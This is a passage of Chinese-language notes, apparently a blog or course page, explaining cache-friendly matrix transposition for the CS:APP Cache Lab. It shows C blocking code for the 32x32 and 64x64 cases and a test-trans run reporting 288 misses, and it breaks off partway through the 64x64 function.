</span><span id=__span-135-10><a id=__codelineno-135-10 name=__codelineno-135-10></a><span class=w>                </span><span class=kt>int</span><span class=w> </span><span class=n>a_1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=o>+</span><span class=mi>1</span><span class=p>];</span>
</span><span id=__span-135-11><a id=__codelineno-135-11 name=__codelineno-135-11></a><span class=w>                </span><span class=kt>int</span><span class=w> </span><span class=n>a_2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=o>+</span><span class=mi>2</span><span class=p>];</span>
</span><span id=__span-135-12><a id=__codelineno-135-12 name=__codelineno-135-12></a><span class=w>                </span><span class=kt>int</span><span class=w> </span><span class=n>a_3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=o>+</span><span class=mi>3</span><span class=p>];</span>
</span><span id=__span-135-13><a id=__codelineno-135-13 name=__codelineno-135-13></a><span class=w>                </span><span class=kt>int</span><span class=w> </span><span class=n>a_4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=o>+</span><span class=mi>4</span><span class=p>];</span>
</span><span id=__span-135-14><a id=__codelineno-135-14 name=__codelineno-135-14></a><span class=w>                </span><span class=kt>int</span><span class=w> </span><span class=n>a_5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=o>+</span><span class=mi>5</span><span class=p>];</span>
</span><span id=__span-135-15><a id=__codelineno-135-15 name=__codelineno-135-15></a><span class=w>                </span><span class=kt>int</span><span class=w> </span><span class=n>a_6</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=o>+</span><span class=mi>6</span><span class=p>];</span>
</span><span id=__span-135-16><a id=__codelineno-135-16 name=__codelineno-135-16></a><span class=w>                </span><span class=kt>int</span><span class=w> </span><span class=n>a_7</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=o>+</span><span class=mi>7</span><span class=p>];</span>
</span><span id=__span-135-17><a id=__codelineno-135-17 name=__codelineno-135-17></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_0</span><span class=p>;</span>
</span><span id=__span-135-18><a id=__codelineno-135-18 name=__codelineno-135-18></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=o>+</span><span class=mi>1</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_1</span><span class=p>;</span>
</span><span id=__span-135-19><a id=__codelineno-135-19 name=__codelineno-135-19></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=o>+</span><span class=mi>2</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_2</span><span class=p>;</span>
</span><span id=__span-135-20><a id=__codelineno-135-20 name=__codelineno-135-20></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=o>+</span><span class=mi>3</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_3</span><span class=p>;</span>
</span><span id=__span-135-21><a id=__codelineno-135-21 name=__codelineno-135-21></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=o>+</span><span class=mi>4</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_4</span><span class=p>;</span>
</span><span id=__span-135-22><a id=__codelineno-135-22 name=__codelineno-135-22></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=o>+</span><span class=mi>5</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_5</span><span class=p>;</span>
</span><span id=__span-135-23><a id=__codelineno-135-23 name=__codelineno-135-23></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=o>+</span><span class=mi>6</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_6</span><span class=p>;</span>
</span><span id=__span-135-24><a id=__codelineno-135-24 name=__codelineno-135-24></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=o>+</span><span class=mi>7</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_7</span><span class=p>;</span>
</span><span id=__span-135-25><a id=__codelineno-135-25 name=__codelineno-135-25></a><span class=w>            </span><span class=p>}</span>
</span><span id=__span-135-26><a id=__codelineno-135-26 name=__codelineno-135-26></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-135-27><a id=__codelineno-135-27 name=__codelineno-135-27></a><span class=w>    </span><span class=p>}</span><span class=w>            </span>
</span><span id=__span-135-28><a id=__codelineno-135-28 name=__codelineno-135-28></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>对于非对角线上的块，本身就没有额外的冲突；对于对角线上的块，写入A每一行的第一个元素后，这一行的元素都进入了缓存，我们就立即用本地变量(存放在寄存器里)存下这 8 个元素，随后再复制给B。这样，就避免了第一个元素复制时，B把A的缓存行驱逐，导致没有利用上A的缓存行。结果miss次数为 288，满分。</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-136-1> 1</a></span>
<span class=normal><a href=#__codelineno-136-2> 2</a></span>
<span class=normal><a href=#__codelineno-136-3> 3</a></span>
<span class=normal><a href=#__codelineno-136-4> 4</a></span>
<span class=normal><a href=#__codelineno-136-5> 5</a></span>
<span class=normal><a href=#__codelineno-136-6> 6</a></span>
<span class=normal><a href=#__codelineno-136-7> 7</a></span>
<span class=normal><a href=#__codelineno-136-8> 8</a></span>
<span class=normal><a href=#__codelineno-136-9> 9</a></span>
<span class=normal><a href=#__codelineno-136-10>10</a></span>
<span class=normal><a href=#__codelineno-136-11>11</a></span>
<span class=normal><a href=#__codelineno-136-12>12</a></span>
<span class=normal><a href=#__codelineno-136-13>13</a></span>
<span class=normal><a href=#__codelineno-136-14>14</a></span>
<span class=normal><a href=#__codelineno-136-15>15</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-136-1><a id=__codelineno-136-1 name=__codelineno-136-1></a><span class=m>05</span>-Cache-Lab$<span class=w> </span>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./test-trans<span class=w> </span>-M<span class=w> </span><span class=m>32</span><span class=w> </span>-N<span class=w> </span><span class=m>32</span>
</span><span id=__span-136-2><a id=__codelineno-136-2 name=__codelineno-136-2></a>...
</span><span id=__span-136-3><a id=__codelineno-136-3 name=__codelineno-136-3></a>Function<span class=w> </span><span class=m>0</span><span class=w> </span><span class=o>(</span><span class=m>2</span><span class=w> </span>total<span class=o>)</span>
</span><span id=__span-136-4><a id=__codelineno-136-4 name=__codelineno-136-4></a>Step<span class=w> </span><span class=m>1</span>:<span class=w> </span>Validating<span class=w> </span>and<span class=w> </span>generating<span class=w> </span>memory<span class=w> </span>traces
</span><span id=__span-136-5><a id=__codelineno-136-5 name=__codelineno-136-5></a>Step<span class=w> </span><span class=m>2</span>:<span class=w> </span>Evaluating<span class=w> </span>performance<span class=w> </span><span class=o>(</span><span class=nv>s</span><span class=o>=</span><span class=m>5</span>,<span class=w> </span><span class=nv>E</span><span class=o>=</span><span class=m>1</span>,<span class=w> </span><span class=nv>b</span><span class=o>=</span><span class=m>5</span><span class=o>)</span>
</span><span id=__span-136-6><a id=__codelineno-136-6 name=__codelineno-136-6></a>func<span class=w> </span><span class=m>0</span><span class=w> </span><span class=o>(</span>Transpose<span class=w> </span>submission<span class=o>)</span>:<span class=w> </span>hits:1765,<span class=w> </span>misses:288,<span class=w> </span>evictions:256
</span><span id=__span-136-7><a id=__codelineno-136-7 name=__codelineno-136-7></a>
</span><span id=__span-136-8><a id=__codelineno-136-8 name=__codelineno-136-8></a>Function<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span><span class=m>2</span><span class=w> </span>total<span class=o>)</span>
</span><span id=__span-136-9><a id=__codelineno-136-9 name=__codelineno-136-9></a>Step<span class=w> </span><span class=m>1</span>:<span class=w> </span>Validating<span class=w> </span>and<span class=w> </span>generating<span class=w> </span>memory<span class=w> </span>traces
</span><span id=__span-136-10><a id=__codelineno-136-10 name=__codelineno-136-10></a>Step<span class=w> </span><span class=m>2</span>:<span class=w> </span>Evaluating<span class=w> </span>performance<span class=w> </span><span class=o>(</span><span class=nv>s</span><span class=o>=</span><span class=m>5</span>,<span class=w> </span><span class=nv>E</span><span class=o>=</span><span class=m>1</span>,<span class=w> </span><span class=nv>b</span><span class=o>=</span><span class=m>5</span><span class=o>)</span>
</span><span id=__span-136-11><a id=__codelineno-136-11 name=__codelineno-136-11></a>func<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span>Simple<span class=w> </span>row-wise<span class=w> </span>scan<span class=w> </span>transpose<span class=o>)</span>:<span class=w> </span>hits:869,<span class=w> </span>misses:1184,<span class=w> </span>evictions:1152
</span><span id=__span-136-12><a id=__codelineno-136-12 name=__codelineno-136-12></a>
</span><span id=__span-136-13><a id=__codelineno-136-13 name=__codelineno-136-13></a>Summary<span class=w> </span><span class=k>for</span><span class=w> </span>official<span class=w> </span>submission<span class=w> </span><span class=o>(</span>func<span class=w> </span><span class=m>0</span><span class=o>)</span>:<span class=w> </span><span class=nv>correctness</span><span class=o>=</span><span class=m>1</span><span class=w> </span><span class=nv>misses</span><span class=o>=</span><span class=m>288</span>
</span><span id=__span-136-14><a id=__codelineno-136-14 name=__codelineno-136-14></a>
</span><span id=__span-136-15><a id=__codelineno-136-15 name=__codelineno-136-15></a><span class=nv>TEST_TRANS_RESULTS</span><span class=o>=</span><span class=m>1</span>:288
</span></code></pre></div></td></tr></table></div> <h4 id=64-x-64>64 x 64<a class=headerlink href=#64-x-64 title="Permanent link">¶</a></h4> <p>由于此时矩阵每 4 行就会占满缓存，考虑 8 × 8 分块，在分块内部处理时就需要技巧了，我们把分块内部再分成 4 个 4 × 4 的小分块分别处理：</p> <ul> <li>第一步，将A的左上和右上一次性复制给B</li> <li>第二步，用本地变量把B的右上角存储下来</li> <li>第三步，将A的左下复制给B的右上</li> <li>第四步，利用上述存储B的右上角的本地变量，把A的右上复制给B的左下</li> <li>第五步，把A的右下复制给B的右下</li> </ul> <p>图解如下：(这里的A和B均表示两个矩阵中的 8 × 8 块)</p> <p>第 1 步：得到A的第1, 2块，并将它们复制给B的第1, 2块 (注意此时B的第2块放置的位置是错的，后面会被更正)。此时B的前 4 行就在缓存中了。</p> <p><img alt="alt text" src=../../img/image-103.png></p> <p>第 2 步：用本地变量把B的第 2 块存储下来</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-137-1>1</a></span>
<span class=normal><a href=#__codelineno-137-2>2</a></span>
<span class=normal><a href=#__codelineno-137-3>3</a></span>
<span class=normal><a href=#__codelineno-137-4>4</a></span>
<span class=normal><a href=#__codelineno-137-5>5</a></span>
<span class=normal><a href=#__codelineno-137-6>6</a></span>
<span class=normal><a href=#__codelineno-137-7>7</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-137-1><a id=__codelineno-137-1 name=__codelineno-137-1></a><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>j</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-137-2><a id=__codelineno-137-2 name=__codelineno-137-2></a><span class=p>{</span>
</span><span id=__span-137-3><a id=__codelineno-137-3 name=__codelineno-137-3></a><span class=w>    </span><span class=n>a_0</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>];</span>
</span><span id=__span-137-4><a id=__codelineno-137-4 name=__codelineno-137-4></a><span class=w>    </span><span class=n>a_1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>5</span><span class=p>];</span>
</span><span id=__span-137-5><a id=__codelineno-137-5 name=__codelineno-137-5></a><span class=w>    </span><span class=n>a_2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>6</span><span class=p>];</span>
</span><span id=__span-137-6><a id=__codelineno-137-6 name=__codelineno-137-6></a><span class=w>    </span><span class=n>a_3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>7</span><span class=p>];</span>
</span><span id=__span-137-7><a id=__codelineno-137-7 name=__codelineno-137-7></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>第 3 步：现在缓存中还是存着B中块1和块2的内容，所以将A的第 3 块内容复制给它。</p> <p><img alt="alt text" src=../../img/image-104.png></p> <p>第 4/5 步：现在缓存已经利用到极致了，可以开辟B的下面两块了。</p> <p><img alt="alt text" src=../../img/image-105.png></p> <p>这样就实现了转置，且消除了同一行中的冲突，具体代码如下：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-138-1> 1</a></span>
<span class=normal><a href=#__codelineno-138-2> 2</a></span>
<span class=normal><a href=#__codelineno-138-3> 3</a></span>
<span class=normal><a href=#__codelineno-138-4> 4</a></span>
<span class=normal><a href=#__codelineno-138-5> 5</a></span>
<span class=normal><a href=#__codelineno-138-6> 6</a></span>
<span class=normal><a href=#__codelineno-138-7> 7</a></span>
<span class=normal><a href=#__codelineno-138-8> 8</a></span>
<span class=normal><a href=#__codelineno-138-9> 9</a></span>
<span class=normal><a href=#__codelineno-138-10>10</a></span>
<span class=normal><a href=#__codelineno-138-11>11</a></span>
<span class=normal><a href=#__codelineno-138-12>12</a></span>
<span class=normal><a href=#__codelineno-138-13>13</a></span>
<span class=normal><a href=#__codelineno-138-14>14</a></span>
<span class=normal><a href=#__codelineno-138-15>15</a></span>
<span class=normal><a href=#__codelineno-138-16>16</a></span>
<span class=normal><a href=#__codelineno-138-17>17</a></span>
<span class=normal><a href=#__codelineno-138-18>18</a></span>
<span class=normal><a href=#__codelineno-138-19>19</a></span>
<span class=normal><a href=#__codelineno-138-20>20</a></span>
<span class=normal><a href=#__codelineno-138-21>21</a></span>
<span class=normal><a href=#__codelineno-138-22>22</a></span>
<span class=normal><a href=#__codelineno-138-23>23</a></span>
<span class=normal><a href=#__codelineno-138-24>24</a></span>
<span class=normal><a href=#__codelineno-138-25>25</a></span>
<span class=normal><a href=#__codelineno-138-26>26</a></span>
<span class=normal><a href=#__codelineno-138-27>27</a></span>
<span class=normal><a href=#__codelineno-138-28>28</a></span>
<span class=normal><a href=#__codelineno-138-29>29</a></span>
<span class=normal><a href=#__codelineno-138-30>30</a></span>
<span class=normal><a href=#__codelineno-138-31>31</a></span>
<span class=normal><a href=#__codelineno-138-32>32</a></span>
<span class=normal><a href=#__codelineno-138-33>33</a></span>
<span class=normal><a href=#__codelineno-138-34>34</a></span>
<span class=normal><a href=#__codelineno-138-35>35</a></span>
<span class=normal><a href=#__codelineno-138-36>36</a></span>
<span class=normal><a href=#__codelineno-138-37>37</a></span>
<span class=normal><a href=#__codelineno-138-38>38</a></span>
<span class=normal><a href=#__codelineno-138-39>39</a></span>
<span class=normal><a href=#__codelineno-138-40>40</a></span>
<span class=normal><a href=#__codelineno-138-41>41</a></span>
<span class=normal><a href=#__codelineno-138-42>42</a></span>
<span class=normal><a href=#__codelineno-138-43>43</a></span>
<span class=normal><a href=#__codelineno-138-44>44</a></span>
<span class=normal><a href=#__codelineno-138-45>45</a></span>
<span class=normal><a href=#__codelineno-138-46>46</a></span>
<span class=normal><a href=#__codelineno-138-47>47</a></span>
<span class=normal><a href=#__codelineno-138-48>48</a></span>
<span class=normal><a href=#__codelineno-138-49>49</a></span>
<span class=normal><a href=#__codelineno-138-50>50</a></span>
<span class=normal><a href=#__codelineno-138-51>51</a></span>
<span class=normal><a href=#__codelineno-138-52>52</a></span>
<span class=normal><a href=#__codelineno-138-53>53</a></span>
<span class=normal><a href=#__codelineno-138-54>54</a></span>
<span class=normal><a href=#__codelineno-138-55>55</a></span>
<span class=normal><a href=#__codelineno-138-56>56</a></span>
<span class=normal><a href=#__codelineno-138-57>57</a></span>
<span class=normal><a href=#__codelineno-138-58>58</a></span>
<span class=normal><a href=#__codelineno-138-59>59</a></span>
<span class=normal><a href=#__codelineno-138-60>60</a></span>
<span class=normal><a href=#__codelineno-138-61>61</a></span>
<span class=normal><a href=#__codelineno-138-62>62</a></span>
<span class=normal><a href=#__codelineno-138-63>63</a></span>
<span class=normal><a href=#__codelineno-138-64>64</a></span>
<span class=normal><a href=#__codelineno-138-65>65</a></span>
<span class=normal><a href=#__codelineno-138-66>66</a></span>
<span class=normal><a href=#__codelineno-138-67>67</a></span>
<span class=normal><a href=#__codelineno-138-68>68</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-138-1><a id=__codelineno-138-1 name=__codelineno-138-1></a><span class=kt>void</span><span class=w> </span><span class=nf>transpose_64x64</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>M</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>N</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>N</span><span class=p>][</span><span class=n>M</span><span class=p>],</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>B</span><span class=p>[</span><span class=n>M</span><span class=p>][</span><span class=n>N</span><span class=p>])</span>
</span><span id=__span-138-2><a id=__codelineno-138-2 name=__codelineno-138-2></a><span class=p>{</span>
</span><span id=__span-138-3><a id=__codelineno-138-3 name=__codelineno-138-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>a_0</span><span class=p>,</span><span class=w> </span><span class=n>a_1</span><span class=p>,</span><span class=w> </span><span class=n>a_2</span><span class=p>,</span><span class=w> </span><span class=n>a_3</span><span class=p>,</span><span class=w> </span><span class=n>a_4</span><span class=p>,</span><span class=w> </span><span class=n>a_5</span><span class=p>,</span><span class=w> </span><span class=n>a_6</span><span class=p>,</span><span class=w> </span><span class=n>a_7</span><span class=p>;</span>
</span><span id=__span-138-4><a id=__codelineno-138-4 name=__codelineno-138-4></a><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>64</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=mi>8</span><span class=p>)</span>
</span><span id=__span-138-5><a id=__codelineno-138-5 name=__codelineno-138-5></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-138-6><a id=__codelineno-138-6 name=__codelineno-138-6></a><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>64</span><span class=p>;</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=mi>8</span><span class=p>)</span>
</span><span id=__span-138-7><a id=__codelineno-138-7 name=__codelineno-138-7></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-138-8><a id=__codelineno-138-8 name=__codelineno-138-8></a><span class=w>            </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-138-9><a id=__codelineno-138-9 name=__codelineno-138-9></a><span class=w>            </span><span class=p>{</span>
</span><span id=__span-138-10><a id=__codelineno-138-10 name=__codelineno-138-10></a><span class=w>                </span><span class=c1>// 得到A的第1, 2块</span>
</span><span id=__span-138-11><a id=__codelineno-138-11 name=__codelineno-138-11></a><span class=w>                </span><span class=n>a_0</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>0</span><span class=p>];</span>
</span><span id=__span-138-12><a id=__codelineno-138-12 name=__codelineno-138-12></a><span class=w>                </span><span class=n>a_1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>];</span>
</span><span id=__span-138-13><a id=__codelineno-138-13 name=__codelineno-138-13></a><span class=w>                </span><span class=n>a_2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>2</span><span class=p>];</span>
</span><span id=__span-138-14><a id=__codelineno-138-14 name=__codelineno-138-14></a><span class=w>                </span><span class=n>a_3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>3</span><span class=p>];</span>
</span><span id=__span-138-15><a id=__codelineno-138-15 name=__codelineno-138-15></a><span class=w>                </span><span class=n>a_4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>];</span>
</span><span id=__span-138-16><a id=__codelineno-138-16 name=__codelineno-138-16></a><span class=w>                </span><span class=n>a_5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>5</span><span class=p>];</span>
</span><span id=__span-138-17><a id=__codelineno-138-17 name=__codelineno-138-17></a><span class=w>                </span><span class=n>a_6</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>6</span><span class=p>];</span>
</span><span id=__span-138-18><a id=__codelineno-138-18 name=__codelineno-138-18></a><span class=w>                </span><span class=n>a_7</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>A</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>7</span><span class=p>];</span>
</span><span id=__span-138-19><a id=__codelineno-138-19 name=__codelineno-138-19></a><span class=w>                </span><span class=c1>// 复制给B的第1, 2块</span>
</span><span id=__span-138-20><a id=__codelineno-138-20 name=__codelineno-138-20></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>0</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_0</span><span class=p>;</span>
</span><span id=__span-138-21><a id=__codelineno-138-21 name=__codelineno-138-21></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_1</span><span class=p>;</span>
</span><span id=__span-138-22><a id=__codelineno-138-22 name=__codelineno-138-22></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>2</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_2</span><span class=p>;</span>
</span><span id=__span-138-23><a id=__codelineno-138-23 name=__codelineno-138-23></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>3</span><span class=p>][</span><span class=n>k</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_3</span><span class=p>;</span>
</span><span id=__span-138-24><a id=__codelineno-138-24 name=__codelineno-138-24></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>0</span><span class=p>][</span><span class=n>k</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_4</span><span class=p>;</span>
</span><span id=__span-138-25><a id=__codelineno-138-25 name=__codelineno-138-25></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>][</span><span class=n>k</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_5</span><span class=p>;</span>
</span><span id=__span-138-26><a id=__codelineno-138-26 name=__codelineno-138-26></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>2</span><span class=p>][</span><span class=n>k</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_6</span><span class=p>;</span>
</span><span id=__span-138-27><a id=__codelineno-138-27 name=__codelineno-138-27></a><span class=w>                </span><span class=n>B</span><span class=p>[</span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>3</span><span class=p>][</span><span class=n>k</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>a_7</span><span class=p>;</span>
</span><span id=__span-138-28><a id=__codelineno-138-28 name=__codelineno-138-28></a><span class=w>            </span><span class=p>}</span>
</span><span id=__span-138-29><a id=__codelineno-138-29 name=__codelineno-138-29></a>
</span><span id=__span-138-30><a id=__codelineno-138-30 name=__codelineno-138-30></a><span class=w>            </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>j</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>;</span><span class=w> </span><span class=n>k</span><span class=o>++</span><span class=p>)</span>
</span><span id=__span-138-31><a id=__codelineno-138-31 name=__codelineno-138-31></a><span class=w>            </span><span class=p>{</span>
</span><span id=__span-138-32><a id=__codelineno-138-32 name=__codelineno-138-32></a><span class=w>                </span><span class=c1>// 得到B的第2块</span>
</span><span id=__span-138-33><a id=__codelineno-138-33 name=__codelineno-138-33></a><span class=w>                </span><span class=n>a_0</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>4</span><span class=p>];</span>
</span><span id=__span-138-34><a id=__codelineno-138-34 name=__codelineno-138-34></a><span class=w>                </span><span class=n>a_1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>B</span><span class=p>[</span><span class=n>k</span><span class=p>][</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>5</span><span class=p>];</span>
